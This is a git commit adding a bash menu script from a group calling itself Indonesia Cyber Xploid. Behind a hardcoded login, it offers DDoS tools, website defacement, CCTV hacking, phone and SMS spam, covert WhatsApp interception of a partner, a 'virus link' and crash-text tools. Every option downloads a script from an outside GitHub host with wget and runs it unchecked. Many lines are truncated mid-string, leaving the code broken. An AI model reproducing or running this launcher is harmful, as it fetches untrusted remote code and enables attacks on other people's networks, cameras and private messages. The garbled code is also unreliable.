802f16f3de760251520799759fd04001addfc7cb
Indonesia Cyber Xploid <94686141+IndonesiaCyberXploid@users.noreply.github.com>
2021-11-28 18:29:42 +0700

    Add files via upload

---
+++ bash Anjayy.sh
@@ -0,0 +1,224 @@
+# eittss mau recode?
+# hargain authornya
+# subscribe INDONESIA CYBER X0LOID
+
+#regis dulu
+clear                                 
+echo $red "Masukkan Username Dan Password Di Bawah Ini>
+
+     read -p "User =>" user
+     read -p "Pass =>" pass
+        sleep 0.1
+
+#usernamenya sob
+if [ $user = "Bangsad" ]
+   then
+      echo $red "#####################"
+   echo $red "##"$yellow "Username Succes"$red "##"
+   echo $red "#####################"
+   sleep 0.1                                             else
+   echo $black "#####################"
+   echo $black "##"$red "Passwor Succes"$black "##"
+
+   echo $black "####################"
+   sleep 3
+   sleep 0.1
+fi
+#passwordnya sobb
+if [ $pass = "INDONESIA CYBER XPLPOD" ]
+    then
+   echo $red "#####################"
+   echo $red "##"$yellow "Password Succes"$red "##"
+   echo $red "#####################"
+   sleep 3
+   sleep 0.1
+#usernamenya sob
+if [ $user = "admin" ]
+   then
+      echo $red "#####################"
+   echo $red "##"$yellow "Username Succes"$red "##"      echo $red "#####################"
+   sleep 0.1
+   else
+   echo $black "#####################"
+   echo $black "##"$red "Passwor Succes"$black "##"   
+   echo $black "####################"
+   sleep 3
+   sleep 0.1
+fi
+#passwordnya sobb
+if [ $pass = "INDONESIA CYBER XPLPOD" ]
+    then
+   echo $red "#####################"
+   echo $red "##"$yellow "Password Succes"$red "##"
+   echo $red "#####################"
+   sleep 3
+   sleep 0.1
+fi
+clear
+# tampilannya
+echo $yellow "######################"
+echo $yellow "####"$black "000"$yellow "####"$black ">
+echo $yellow "####"$black "000"$yellow "####"$black ">
+echo $yellow "######################"
+echo $yellow "######################"                 echo $yellow "###"$black "=============="$yellow "###"
+echo $yellow "###"$black "=============="$yellow "###"
+echo $yellow "######################"
+# coddingan termux dan kali linux
+echo $black "========================================>
+echo $red "Author : Angga Xploid"
+echo $red "Team   :"$green "INDONEAIA CYBER XPLOID"
+echo $red "Yt     : INDONESIA CYBER XPLOID"
+echo $black "========================================>
+echo
+echo $black "========================================>
+echo $yellow "1]. Tools Banyak Tapi Dikit"
+echo $yellow"2]. DDOS Spesial Banyak"
+echo $yellow "3]. DDOS SPOON"
+echo $yellow "4]. Tools DarkFly"
+echo $yellow "5]. DDOS MugiWARA"        
+echo $yellow"6]. Install SOCK"
+echo $yellow "7]. DDOS PentMenu"
+echo $yellow "8]. DDOS Hammer"
+echo $yellow "9]. DDOS LITTEDDDOS"
+echo $yellow "10]. Script Deface Keren"
+echo $yellow "11]. Hack CCTV"
+echo $yellow "12]. Hack CCTV PUB"
+echo $yellow "13]. Hack CCTV Negara"
+echo $yellow "14]. Tools SPAM Plus"
+echo $yellow "15]. Sadap WA Pacar"
+echo $yellow "16]. Virtex Aja Lahh"
+echo $yellow "17]. Virus Link"
+echo $yellow "18]. Spam No Telp"
+echo $yellow "19]. DDOS High ID"
+echo $yellow "20]. DDOS Low ID"
+echo $yellow "21]. Nuyul BTC"
+echo $yellow "22]. Pulsa Gratis"
+echo $yellow "99]. Keluar Aja"
+echo $black "========================================>
+echo $green "Pilih Aja Sesuka Kalian"
+read -p "Pilih =>" keju
+if [ $keju = 1 ]
+then
+   wget https://raw.githubusercontent.com/WhoAmI-T1T4>
+    sh Tools-Sultan.sh
+fi
+if [ $keju = 2 ]
+then
+wget https://raw.githubusercontent.com/WhoAmI-T1T4N>
+   sh Tools-4J4X.sh
+fi
+if [ $keju = 3 ]
+then
+  wget https://raw.githubusercontent.com/BLACK-PHANTO>
+   python2 SPOONDDOS.py
+fi
+if [ $keju = 4 ]
+then
+  wget https://raw.githubusercontent.com/Ranginang67/>
+   python2 install.py
+     darkfly
+fi
+if [ $keju = 5 ]
+then
+  wget https://raw.githubusercontent.com/WhoAmI-T1T4N>
+    python2 MuGiWARA-DDOS.py
+fi
+if [ $keju = 6 ]
+then
+  wget https://raw.githubusercontent.com/WhoAmI-T1T4N>
+    python2 sockss.py
+fi
+if [ $keju = 7 ]
+then
+  wget https://raw.githubusercontent.com/GinjaChris/p>
+    ./pentmenu
+fi
+if [ $keju = 8 ]
+then
+  wget https://raw.githubusercontent.com/cyweb/hammer>
+    python3 hammer.py
+fi
+if [ $keju = 9 ]
+then
+  wget https://raw.githubusercontent.com/4L13199/LITE>
+    python2 LITEDDOS.py
+fi
+if [ $keju = 10 ]
+then
+  wget https://raw.githubusercontent.com/4L13199/LITE>
+   python2 LITESCRIPT.py
+fi
+if [ $keju = 11 ]
+then
+  wget https://raw.githubusercontent.com/MrVirusSpm-0>
+    sh cchek.sh
+fi
+if [ $keju = 12 ]
+then
+  wget https://raw.githubusercontent.com/MrVirusSpm-0>
+    python2 cctv.py
+fi
+if [ $keju = 13 ]
+then
+  wget https://raw.githubusercontent.com/AngelSecurit>
+    python3 cam-hackers.py
+fi
+if [ $keju = 14 ]
+then
+  wget https://raw.githubusercontent.com/4L13199/LITE>
+    bash LITESPAM.sh
+fi
+if [ $keju = 15 ]
+then
+  wget https://raw.githubusercontent.com/Anonymous3-S>
+    sh MrSadapWhatsApp.sh
+fi
+if [ $keju = 16 ]
+then
+  termux-setup-storage
+    git clone https://github.com/MR-X-junior/Virtex
+     cd Virtex
+      python3 Virtex.py
+fi
+if [ $keju = 17 ]
+then
+  wget https://raw.githubusercontent.com/WhoAmI-T1T4N>
+    sh Virus-HOKI.sh
+fi
+if [ $keju = 18 ]
+then
+  wget https://raw.githubusercontent.com/WhoAmI-T1T4N>
+    bash NelponNgasal.sh
+fi
+if [ $keju = 19 ]
+then
+  wget https://raw.githubusercontent.com/BLACK-PHANTO>
+    python2 high.py
+fi
+if [ $keju = 20 ]
+then
+  wget https://raw.githubusercontent.com/BLACK-PHANTO>
+    python2 low.py
+fi
+if [ $keju = 21 ]
+then
+  wget https://raw.githubusercontent.com/WhoAmI-T1T4N>
+    python BTC_Slayer.py
+fi
+if [ $keju = 22 ]
+then
+  wget https://raw.githubusercontent.com/MrTamfanX/Pu>
+    sh PulsaOmTamfan.sh
+fi                                    
+if [ $keju = 99 ]
+then
+echo $green "   IIIIIIIII  "
+echo $green "   IIIIIIIII  "
+echo $green "   IIIIIIIII  "
+echo $green "   IIIIIIIII  "
+echo $green "   IIIIIIIII  "
+echo $green "   IIIIIIIII  "
+echo $green "   IIIIIIIII  "
+echo $green "   IIIIIIIII  "
+exit
+fi
